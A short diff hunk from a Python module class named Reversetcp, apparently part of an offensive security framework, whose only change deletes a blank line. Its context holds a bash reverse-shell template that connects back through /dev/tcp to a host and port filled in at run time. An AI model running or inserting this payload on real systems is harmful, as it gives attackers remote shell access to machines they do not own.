@@ -20,7 +20,6 @@ class Reversetcp(Module):
     """
     
     
-    
     vectors = { 
                'shell.sh' : { "/dev/tcp"       : "/bin/bash -c \'/bin/bash 0</dev/tcp/%s/%s 1>&0 2>&0\'"
                 }
